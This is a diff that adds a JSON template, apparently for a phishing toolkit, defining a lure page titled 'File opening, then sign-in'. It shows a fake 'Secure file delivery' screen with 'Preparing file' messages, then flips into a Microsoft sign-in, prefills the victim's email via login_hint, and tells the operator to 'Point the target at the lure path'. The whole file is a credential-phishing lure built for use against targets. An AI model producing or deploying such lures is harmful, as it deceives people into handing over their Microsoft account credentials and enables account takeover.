@@ -1,0 +1,13 @@
+{
+  "title": "File opening, then sign-in",
+  "description": "Two-step page: a document prepares to open, then the card flips into a Microsoft sign-in. The typed address is carried to the lure as ?login_hint= so Microsoft prefills it. Point the target at the lure path.",
+  "category": "document",
+  "delay": 4,
+  "accent": "#d7d8dc",
+  "logo": "file",
+  "brand": "Secure file delivery",
+  "title_text": "Preparing your file",
+  "subtitle": "Please wait while this document is prepared for viewing. You will be asked to confirm your identity before it opens.",
+  "button": "Sign in now",
+  "messages": ["Preparing file.", "Verifying document.", "Ready"]
+}
